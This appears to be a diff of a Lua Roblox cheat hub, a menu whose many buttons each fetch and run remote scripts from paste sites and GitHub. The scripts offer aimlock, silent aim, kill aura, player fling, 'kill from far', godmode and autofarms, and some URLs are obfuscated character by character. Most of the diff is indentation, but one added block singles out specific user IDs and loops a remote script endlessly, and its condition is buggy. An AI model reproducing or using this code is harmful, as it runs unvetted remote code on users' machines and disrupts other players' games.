+loadstring(game:HttpGet('https://raw.githubusercontent.com/FreeRobloxScripts1/Haxker_6666666-Hub/main/Script-Hub/Version-2.9'))()
+-- Haxker_666 2.9 new update
 end)
 HubSection:NewButton("Ghub ui v7", "good hub", function()
 --[[
@@ -2060,7 +2060,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/Ghub-v9/main/G
 end)
 HubSection:NewButton("Ghub ui v10 new version", "new version ghub", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/Ghubv10/main/GHUBv10.txt"))()
-  -- Ghub ui v10 new version
+-- Ghub ui v10 new version
 end)
 HubSection:NewButton("TMR X(new version) (fixed)", "fixed", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/TMR-X/main/Script"))()
@@ -2079,8 +2079,8 @@ K00lkidd gui revival new
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/theawesomari0/c00lgui/66033e8ff67eccc421fb04b3924e42d4adf3d7a2/c00lgui%20v2.2"), true))()
 end)
 HubSection:NewButton("K00lkidd gui revival 2.3(new version)", "k00lkidd", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/theawesomari0/c00lgui/main/c00lgui%20v2.3", true))()
-  -- k00lkidd gui revival 2.3 new version
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theawesomari0/c00lgui/main/c00lgui%20v2.3", true))()
+-- k00lkidd gui revival 2.3 new version
 end)
 HubSection:NewButton("Hydro hub", "blah", function()
 --[[
@@ -2113,8 +2113,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/BinaryDex/DexHub/main
 --Dex hub
 end)
 HubSection:NewButton("DexHub", "dexhub", function()
-  --dexHub
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/BinaryDex/DexHub/main/Init"))()
+--dexHub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BinaryDex/DexHub/main/Init"))()
 end)
 HubSection:NewButton("Spanish hub v4", "no ingles", function()
 loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SPANISH-HUB-V4-THE-GOAT-HUB-8429"))()
@@ -2140,23 +2140,23 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Balkanx/Balkan-x/main
 end)
 
 HubSection:NewButton("BUTIF Universal hub", "by BUTIF", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/NEWBUTIF/Universal-Script-Hub/main/Butif%20Hub%202"))()
-  -- Butif universal hub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NEWBUTIF/Universal-Script-Hub/main/Butif%20Hub%202"))()
+-- Butif universal hub
 end)
 HubSection:NewButton("Plenem hub", "pyea", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Plenum-Hub/main/loader"))() 
-  -- plenum hub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Plenum-Hub/main/loader"))() 
+-- plenum hub
 end)
 HubSection:NewButton("BritishHub v1.7 (fixed)", "fixed 1.7", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/RedCoat33/Britishhub/main/Protected_7358793088278524.lua.txt", true))()
-  -- british hub v1.7 (fixed) new version
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RedCoat33/Britishhub/main/Protected_7358793088278524.lua.txt", true))()
+-- british hub v1.7 (fixed) new version
 end)
 HubSection:NewButton("Balkan Hub v4 (new version)", "balkan Hub", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Balkanx/Balkan-x/main/Balkan%20x", true))()
-  -- Balkan hub v4 new version
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Balkanx/Balkan-x/main/Balkan%20x", true))()
+-- Balkan hub v4 new version
 end)
 HubSection:NewButton("soon...", "soon...", function()
-  print("komingsoon")
+print("komingsoon")
 end)
 --more soon
 
@@ -2178,8 +2178,14 @@ GamesSection:NewLabel("⭐️ 2024 FREE UGc ⭐️")
 
 GamesSection:NewLabel("🏪 WALMART DISKOVERED 🏪") 
 
-GamesSection:NewButton("kollect koins (Spring Flower Krown LIMITED)", "koins op skript by Tora", function()  
+GamesSection:NewButton("kollect koins (Spring Flower Krown LIMITED)", "koins op skript by Tora", function()
+    local userid = game.Players.LocalPlayers.UserId
+if userid == 4406450103 and 3001347724  then
+while true do loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
+      end
+   else
 loadstring(game:HttpGet("https://pastecode.dev/raw/qfknypsa/walmartKoins.byToraIsMe_lulaslollipop.deb",true))()
+  end
 end) 
 
 GamesSection:NewButton("teleport to game", "koins walmart", function()   game:GetService("TeleportService"):Teleport(13398230007, game:GetService("Players").LocalPlayer) 
@@ -2265,7 +2271,7 @@ end)
 -- [ 🔪🩸XHUXKY 🔪🩸] --
 GamesSection:NewLabel("🔪🩸(SURVIVE cHUcKY's NIGHTMARE)'🔪🩸 \nGRIEFVILLE (FREE ITEM)")
 GamesSection:NewButton("🔪AUTOFARM (FREE PIG HEAD UGX)", "ToraIsMe", function()--xhuxky:16578847473
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/GRIEFVILLE'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/GRIEFVILLE'))()
 end)
 
 GamesSection:NewButton("kill aura,auto kollect &more 🥓", "xhuxky", function()  
@@ -2320,7 +2326,7 @@ end)
 GamesSection:NewButton("Instant ugx🧥 (Tora)", "instant item koat", function()
 --jblland instant🧥
 loadstring(game:HttpGet("https://github.com/ToraScript/Script/raw/fb4aa71e5f8c302e48410643a6e427c79ee03c19/JBLLand",true))()
- end)
+end)
 
 GamesSection:NewButton("teleport to JBL Land", "gameInfo", function()  
 game:GetService("TeleportService"):Teleport(16296040578, game:GetService("Players").LocalPlayer)
@@ -2551,7 +2557,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/Ultaverse/main/
 end)
 
 GamesSection:NewButton("start", "free ugx", function()
-    --start area inf to work
+--start area inf to work
 loadstring(game:HttpGet("https://pastecode.dev/raw/yybqw7w5/startInfPoints-ultaverse_lulaslollipop.jpg",true))()
 end)
 
@@ -2566,7 +2572,7 @@ GamesSection:NewButton("inf points (skript by Bacon)\n(key,Toras might not work 
 loadstring(game:HttpGet("https://pastefy.app/nSUUKWrJ/raw",true))()
 end)
 GamesSection:NewButton("teleport to game", "free ugx", function()
-    --tp to ultaverse
+--tp to ultaverse
 game:GetService("TeleportService"):Teleport(8980446061, game:GetService("Players").LocalPlayer)
 end)
 
@@ -2702,15 +2708,15 @@ end)
 -- [ ⭐️🏋STRONGMAN SIMUALTOR🏋️‍♀️⭐️ ] --
 GamesSection:NewLabel("⭐️🏋️‍♀️STRONGMAN SIMULATOR🏋️‍♀️⭐️FFRREUGX")
 GamesSection:NewButton("strongman autofarm (skript by Tora)\n(no key)", "free ugx", function()
-    --swordstrongman
+--swordstrongman
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/SwordStrongman",true))()
 end)
 GamesSection:NewButton("strongman autofarm (skript by BaconBoss)\n(key,has more)", "free ugx", function()
-    --strongman sim skript/id:6766156863
+--strongman sim skript/id:6766156863
 loadstring(game:HttpGet("https://pastefy.app/TwNiYO5Y/raw",true))()
 end)
 GamesSection:NewButton("teleport to game", "free ugx", function()
-    --tp to strongman sim game
+--tp to strongman sim game
 game:GetService("TeleportService"):Teleport(6766156863, game:GetService("Players").LocalPlayer)
 end)
 
@@ -2737,7 +2743,7 @@ end)
 
 
 GamesSection:NewButton("Nyula(aimloxk)", "nyulanyula", function()--nyula aimloxk
-    loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'X'..'Y'..'Q'..'z'..'d'..'l'..'Z'..'u'..'/'..'r'..'a'..'w'), true))()
+loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'X'..'Y'..'Q'..'z'..'d'..'l'..'Z'..'u'..'/'..'r'..'a'..'w'), true))()
 end)
 GamesSection:NewButton("Aimloxk (use Q tool)", "Q tool", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/DYZ2fug0",true))()
@@ -2747,7 +2753,7 @@ GamesSection:NewButton("any tool -dahood", "any tool pixker for dahood", functio
 loadstring(game:HttpGet("https://pastecode.dev/raw/7PZTHFQZwr/DaHoodanytool",true))()
 end)
 GamesSection:NewButton("StrikeHub", "dahoodhub", function()--daHood strikehub
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/DEV-TK02/StrikeHub/main/Loader'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DEV-TK02/StrikeHub/main/Loader'))()
 end)
 GamesSection:NewButton("DaHood Reborn Aim", "dahood aimloxk", function()loadstring(game:HttpGet("https://pastebin.com/raw/iNd3xTPv"))()
 end)
@@ -2806,7 +2812,7 @@ loadstring(game:HttpGet("https://pastecode.dev/raw/dm174yjv/toEgg-instantUGc_lul
 end)
 
 GamesSection:NewButton("teleport to game(rekommended),\ngame is hard to find", "goto robloxegghunt2024", function()
-    --goto robloxegghunt2024:16962137393
+--goto robloxegghunt2024:16962137393
 game:GetService("TeleportService"):Teleport(16962137393, game:GetService("Players").LocalPlayer)
 end)
 
@@ -2823,7 +2829,7 @@ end)
 --🦍🦖🦍🦖🦍🦖
 GamesSection:NewLabel("🦖GODZILLA X KONG OBBY🦍 \n[FREE ITEMS]")
 GamesSection:NewButton("orbs autofarm by ToraIsMe", "free ugx", function()--godzilla:16462849084
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/Godzilla'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/Godzilla'))()
 end)
 GamesSection:NewButton("teleport to game", "💥🦖🦍🦖🦍🦖💥", function()
 game:GetService("TeleportService"):Teleport(16462849084, game:GetService("Players").LocalPlayer)
@@ -2842,7 +2848,7 @@ end)
 
 GamesSection:NewLabel("🔦📸 The Maze 📸🔦")
 GamesSection:NewButton("(new) mob esp, get items, teleports & more", "good skript used myself", function()
-  --the maze skript by lulas
+--the maze skript by lulas
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/the-maze/lulas/1t2o3msn0f3oa3im9ci_lulaslollipop",true))()
 end)
 GamesSection:NewButton("teleport to game", "the maze", function()  
@@ -2852,15 +2858,15 @@ end)
 
 GamesSection:NewLabel("[Evade🏃🏽‍♂️💨]")
 GamesSection:NewButton("show messages", "shows xhat kause evade dont allow it", function()
-  --xhat on
+--xhat on
 game:GetService("StarterGui"):SetCoreGuiEnabled('Chat', true)
 end)
 GamesSection:NewButton("AutoSpawn,godmode&more - TbaoHub", "good skript used myself", function()
-  --evade autospawn,godmode(tbaoHub)
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade"))()
+--evade autospawn,godmode(tbaoHub)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade"))()
 end)
 GamesSection:NewButton("HydraHub mobile", "good skript used myself", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/Dc2-masket27727/Mobile-s-Hub/main/Main/Hydra/Evade.exe"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dc2-masket27727/Mobile-s-Hub/main/Main/Hydra/Evade.exe"))();
 end)
 GamesSection:NewButton("🆕Dot.Hub(kinda big use toggle on/off)\nFarmWins,godmode,bot ESP &more(OP)", "OP skript", function()
 --evade OP kredits: CF Trail
@@ -2887,15 +2893,15 @@ GamesSection:NewButton("50/50 Pixk A Door", "reveals all doors in lime green", f
 getgenv().Door = true
 
 while wait() do
-  if getgenv().Door == true then
-      for i,v in pairs(game.Workspace.Doors:GetChildren()) do
-          for i,l in pairs(v:GetChildren()) do
-              if l:FindFirstChild("???") then
-                  l.BrickColor = BrickColor.new("Lime green")
-              end
+if getgenv().Door == true then
+  for i,v in pairs(game.Workspace.Doors:GetChildren()) do
+      for i,l in pairs(v:GetChildren()) do
+          if l:FindFirstChild("???") then
+              l.BrickColor = BrickColor.new("Lime green")
           end
       end
   end
+end
 end
 end)
 
@@ -2978,7 +2984,7 @@ GamesSection:NewButton("KILL PLAYER FROM FAR V2", "selekt a player and put kill"
 loadstring(game:HttpGet("https://pastebin.com/raw/W9SYMbiw"))()
 end)
 GamesSection:NewButton("xhaos skript", "for xhaos", function()--xhaos 
-  loadstring(game:HttpGet("https://pastebin.com/raw/3aks6wJy"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/3aks6wJy"))()
 end)
 
 
@@ -2986,46 +2992,46 @@ end)
 GamesSection:NewLabel("[🏏Blade Ball☄️]")
 
 GamesSection:NewButton("just another autoparry&spam gui", "bladeball", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/qxA2ETxy"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/qxA2ETxy"))()
 end)
 
 GamesSection:NewButton("WhiteHub v1 - autoparryv1,v2 autodetekt ", "bladeball", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/E07Wyg7L"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/E07Wyg7L"))()
 end)
 
 GamesSection:NewButton("bladeball- AutoparryV2 gui", "bladeball", function()
-    --bladeball autopartyv2,antilag,holdforspam
-    loadstring(game:HttpGet("https://pastebin.com/raw/g35Y87cu",true))()
+--bladeball autopartyv2,antilag,holdforspam
+loadstring(game:HttpGet("https://pastebin.com/raw/g35Y87cu",true))()
 end)
 
 GamesSection:NewButton("bladeball- Darkrai Hub V2", "bladeball", function()--Blade ball darkraiHubv2
-    loadstring(game:HttpGet("https://pastefy.app/y3MGGd9n/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/y3MGGd9n/raw"))()
 end)
 
 GamesSection:NewButton("Alxhemy Hubv2 (OP)", "bladeball", function()
-  --bladeball alxhemyhubv2
-    loadstring(game:HttpGet("https://pastecode.dev/raw/g3fz5w4s/alxhemyhubv2-bladeball",true))()
+--bladeball alxhemyhubv2
+loadstring(game:HttpGet("https://pastecode.dev/raw/g3fz5w4s/alxhemyhubv2-bladeball",true))()
 end)
 
 GamesSection:NewButton("autoparry easy on/off gui", "bladeball", function()--bladeball auto on/off
-    loadstring(game:HttpGet("https://paste.gg/p/anonymous/1734a4ee207844b994df2f36157afacd/files/1e79ac12fc8a47ef8263d5e9d43b7137/raw"))()
+loadstring(game:HttpGet("https://paste.gg/p/anonymous/1734a4ee207844b994df2f36157afacd/files/1e79ac12fc8a47ef8263d5e9d43b7137/raw"))()
 end)
 --yes
 GamesSection:NewButton("bladeball", "bladeball", function()
-  --bladeball holdbloxkbutton
-  game:GetService("StarterGui"):SetCore("SendNotification",{
-      Title = "skript by Hosvile",
-      Text = "hold bloxk button to spam",
-      Duration = 5
-  })
+--bladeball holdbloxkbutton
+game:GetService("StarterGui"):SetCore("SendNotification",{
+  Title = "skript by Hosvile",
+  Text = "hold bloxk button to spam",
+  Duration = 5
+})
 
-  getgenv().SpamSpeed = 8 -- 1-25
+getgenv().SpamSpeed = 8 -- 1-25
 
-  if not getgenv().exeSpam then
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
-  end
+if not getgenv().exeSpam then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
+end
 
-  getgenv().exeSpam = true
+getgenv().exeSpam = true
 end)
 
 GamesSection:NewButton("Auto Klixker", "bladeball", function()
@@ -3053,8 +3059,8 @@ GamesSection:NewButton("Ln Hub", "lm hub v2 bladeball V2", function()--Ln Hub (b
 loadstring(game:HttpGet('https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV2.lua'))();
 end)
 GamesSection:NewButton("AUTO PARRY", "auto parry for bladeball", function()_G.Config = {
-  MinDistance = 10,
-  DelBallSpeed = 3,
+MinDistance = 10,
+DelBallSpeed = 3,
 }
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua"))()
@@ -3085,7 +3091,7 @@ GamesSection:NewButton("MalixiousDev Hub", "bladeball", function()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/malicious-dev/RobloxScripting/main/bladeball.lua'),true))()
 end)
 GamesSection:NewButton("bladeball skript", "bladeball", function()
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/Godyulikkjos/goolisn0/main/obf_iv59yI506e9j5Vx44SXUtCC0V1TdwuDipkiHVh2OcN7ntzT8Y8j89cWv39yJ22k5.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Godyulikkjos/goolisn0/main/obf_iv59yI506e9j5Vx44SXUtCC0V1TdwuDipkiHVh2OcN7ntzT8Y8j89cWv39yJ22k5.lua'))()
 end)
 
 
@@ -3140,37 +3146,37 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/ma
 -- ixe hub skript
 end)
 GamesSection:NewButton("❄️IxeMael7 Hub❄️", "brookHaven ixehub", function()
-  --Brookhaven IxeMael7
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+--Brookhaven IxeMael7
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
 end)
 
 
 --BLOXFRUIT
 GamesSection:NewLabel("[🍒🍊BLOX FRUITS🍇🍎]")
 GamesSection:NewButton("REDz Hub - Blox fruit", "redzhub", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
 end)
 
 GamesSection:NewButton("speedHub X", "blox", function()
-  -- Blox Fruits
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Speed-Hub-X/main/SpeedHubX", true))()
+-- Blox Fruits
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Speed-Hub-X/main/SpeedHubX", true))()
 end)
 
 GamesSection:NewButton("Fiend1sh Hub", "fruits", function()
-  -- Blox Fruit
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/Fiend1sh/FiendMain/main/ReinLoader'))()
+-- Blox Fruit
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Fiend1sh/FiendMain/main/ReinLoader'))()
 end)
 
 GamesSection:NewButton("mbmxHub (no key)", "bloxfruits", function()
-  -- blox fruits no key
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/any/main/mbmxhub/beta"))()
+-- blox fruits no key
+loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/any/main/mbmxhub/beta"))()
 end)
 GamesSection:NewButton("SepuhHub", "bloxfruit", function()loadstring(game:HttpGet("https://isnahamzahpastebin.tech/sepuh/puh_007.lua"))()
 end)
 GamesSection:NewButton("MTriet Hub", "bloxfruits", function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
 end)
 GamesSection:NewButton("BloxFruits btteam", "bloxfruits", function()
-  loadstring(game:HttpGet('https://btteam.net/scripts-auth/', true))()
+loadstring(game:HttpGet('https://btteam.net/scripts-auth/', true))()
 end)
 GamesSection:NewButton("NEVAHub", "bloxfruits", function()loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
 end)
@@ -3261,8 +3267,8 @@ end)
 
 GamesSection:NewButton("Prison life admin hub", "adminHub",
 function()
-  loadstring(game:HttpGet("https://pastebin.com/raw/GzeWWPWN"))()
-  -- Prison life admin hub
+loadstring(game:HttpGet("https://pastebin.com/raw/GzeWWPWN"))()
+-- Prison life admin hub
 end)
 
 GamesSection:NewButton("Juanko Prison Life Admin Hub", "request by emil", function()
@@ -3362,7 +3368,7 @@ end)
 local GamesSection = Games:NewSection("[☮️🕊️HAZE PIEXE🧘🏽‍♂️🕊️]")
 
 GamesSection:NewButton("ThundarZ hub for haze piexe", "haze piexe", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/main/Main/Loader/AllGame.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/main/Main/Loader/AllGame.lua"))()
 end)
 
 --Ftf
@@ -3375,7 +3381,7 @@ end)
 local GamesSection = Games:NewSection("[❓Murder Mystery 2🔪]")
 
 GamesSection:NewButton("MM2 - TbaoHub thaibao", "tbaohub", function()-- Mm2 tbaohub
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurderMystery2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubMurderMystery2"))()
 end)
 
 GamesSection:NewButton("MM2 GUI (New)", "esp,see murderer&more",
@@ -3393,15 +3399,15 @@ end)
 
 GamesSection:NewButton("Kopy >OP MM2 GUI 2< 🔑", "key: mTAgLLFQJazwRWGh",
 function()
-  setclipboard("mTAgLLFQJazwRWGh")
+setclipboard("mTAgLLFQJazwRWGh")
 
-  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-  Library.DefaultColor = Color3.fromRGB(50,205,50)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-  Library:Notification({
-    Text = "kopied 'OP MM2 GUI 2' 🔑",
-    Duration = 3.5
-  })
+Library:Notification({
+Text = "kopied 'OP MM2 GUI 2' 🔑",
+Duration = 3.5
+})
 end)
 
 GamesSection:NewButton("Symphony Hub (OP!)", "op asf",
@@ -3411,22 +3417,22 @@ end)
 
 GamesSection:NewButton("TheHanki (may be lag)", "🔑 = hawkhubneverdies (work fluxus and delta)",
 function()
-  -- mm2
+-- mm2
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/Hawk/main/Loader", true))()
 end)
 
 GamesSection:NewButton("Kopy > TheHanki < 🔑", "key: hawkhubneverdies",
 function()
-  setclipboard("hawkhubneverdies")
+setclipboard("hawkhubneverdies")
 
-  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
-  Library.DefaultColor = Color3.fromRGB(50,205,50)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+Library.DefaultColor = Color3.fromRGB(50,205,50)
 
-  Library:Notification({
-    Text = "kopied 'TheHanki' 🔑",
-    Duration = 3.5
-  })
+Library:Notification({
+Text = "kopied 'TheHanki' 🔑",
+Duration = 3.5
+})
 end)
 
 
@@ -3443,13 +3449,13 @@ local GamesSection = Games:NewSection("[Breaking Point]")
 GamesSection:NewButton("H4R7NHaxks breakingpoint skript", "bp",
 function()--Skript Breaking point
 
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Obfuscated/master/Breaking%20Point%20H4R7N%20Hack%20v1.2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Obfuscated/master/Breaking%20Point%20H4R7N%20Hack%20v1.2.lua"))()
 end)
 
 GamesSection:NewButton("Anti Die", "work for fluxus and delta",
 function()--anti die
 
-  loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
+loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
 end)
 
 
@@ -3604,7 +3610,7 @@ end)
 local GamesSection = Games:NewSection("No Skope Sniper")
 
 GamesSection:NewButton("Op Silent Aim", "Well its not silent lol", function()
-  getgenv().Settings = {
+getgenv().Settings = {
 
 Fov = 150,
 
@@ -3715,16 +3721,16 @@ end)
 local GamesSection = Games:NewSection("[Roblox is Unbreakable]")
 
 GamesSection:NewButton("roblox is unbreakable", "skript", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MorikTV/Roblox-is-Unbreakable/main/Unbreakable.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MorikTV/Roblox-is-Unbreakable/main/Unbreakable.lua", true))()
 end)
 
 
 local GamesSection = Games:NewSection("[🚽Toilet Tower Defense🧻]")
 
 GamesSection:NewButton("laziumHub", "lazium", function()
-      -- Toilet Tower defenxe
+  -- Toilet Tower defenxe
 
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/NUTellaVING/LaziumHub/main/ToiletTowerDefense.lua"))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/NUTellaVING/LaziumHub/main/ToiletTowerDefense.lua"))()
 end)
 
 
@@ -3732,34 +3738,34 @@ local GamesSection = Games:NewSection("[Sakura Stand]")
 --Sakura Stand
 
 GamesSection:NewButton("sakura Stand", "direkt exekute", function()
-    loadstring(game:HttpGet("https://pastecode.dev/raw/I0KOXXRe/sakuraStand.direktExekute",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/I0KOXXRe/sakuraStand.direktExekute",true))()
 end)
 
 
 local GamesSection = Games:NewSection("[👹Demon Fall👹]")
 
 GamesSection:NewButton("sakura Stand", "direkt exekute", function()
-    --Demon Fall
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/DemonCockCandy",true))()
+--Demon Fall
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/DemonCockCandy",true))()
 end)
 
 
 local GamesSection = Games:NewSection("[🐝Bee Swarm Simulator🐝")
 
 GamesSection:NewButton("item name,item kount", "bee swarm", function()
-    --Bee Swarm Simulator
-    game:GetService("ReplicatedStorage").Remotes.ModifyItemData:FireServer("Item Name", ItemCount)
+--Bee Swarm Simulator
+game:GetService("ReplicatedStorage").Remotes.ModifyItemData:FireServer("Item Name", ItemCount)
 end)
 GamesSection:NewButton("Bee swarm sim skript", "bee swarm", function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/BeeSwarmSimulator.lua')))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/BeeSwarmSimulator.lua')))()
 end)
 
 
 local GamesSection = Games:NewSection("[🚗Kar Dealership💵]")
 
 GamesSection:NewButton("kar dealership", "skript for kar dealership", function()
-    --Kar dealership
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/Loader/main/Loader.lua"))()
+--Kar dealership
+loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/Loader/main/Loader.lua"))()
 end)
 
 
@@ -3771,7 +3777,7 @@ local Fe = Window:NewTab("FE")
 local FeSection = Fe:NewSection("FE Skripts")
 
 FeSection:NewButton("FE server browser ui", "list of servers ui", function()
-  loadstring(game:HttpGet("https://pastecode.dev/raw/l83qm3as/FEserver-browser90_lulaslollipop",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/l83qm3as/FEserver-browser90_lulaslollipop",true))()
 end)
 
 FeSection:NewButton("FE Stop Time", "freeze in mid air or whatever", function()
@@ -3809,8 +3815,8 @@ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/blood
 Library.DefaultColor = Color3.fromRGB(0,255,0)
 
 Library:Notification({
-  Text = "provided by lulaslollipop",
-  Duration = 4
+Text = "provided by lulaslollipop",
+Duration = 4
 })
 
 wait (2)
@@ -3819,34 +3825,34 @@ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/blood
 Library.DefaultColor = Color3.fromRGB(0,255,0)
 
 Library:Notification({
-  Text = "SKRIPT EXEKUTED 🍭🍭🍭🍭",
-  Duration = 4
+Text = "SKRIPT EXEKUTED 🍭🍭🍭🍭",
+Duration = 4
 })
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/L"))()
 end)
 
 FeSection:NewButton("FE Deathnote (fling)", "fling a player by walking into them", function()
-  --feDeathnote
+--feDeathnote
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'G'..'o'..'K'..'x'..'Y'..'B'..'k'..'U'..'/'..'r'..'a'..'w'), true))()
 end)
 
 FeSection:NewButton("FE Ghost", "fling a player by walking into them", function()
-    --FE GHOST SKRIPT
-    --WORKS ON R6
-    --KREDITS TO THE OWNER
+--FE GHOST SKRIPT
+--WORKS ON R6
+--KREDITS TO THE OWNER
 
-    loadstring(game:HttpGet("https://pastebin.com/raw/uUtRsAX5"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/uUtRsAX5"))()
 end)
 
 FeSection:NewButton("FE Deathnote (fling)", "fling a player by walking into them", function()
-  --feDeathnote
+--feDeathnote
 loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'G'..'o'..'K'..'x'..'Y'..'B'..'k'..'U'..'/'..'r'..'a'..'w'), true))()
 end)
 
 FeSection:NewButton("FE bring gui (kollision games only)", "kollision games only", function()
-    --febringgui
-    loadstring(game:HttpGet("https://pastecode.dev/raw/yd80ly8m/FEbringgui_lulaslollipop",true))()
+--febringgui
+loadstring(game:HttpGet("https://pastecode.dev/raw/yd80ly8m/FEbringgui_lulaslollipop",true))()
 end)
 
 FeSection:NewButton("FE Orbit player", "spin em", function()--skrip
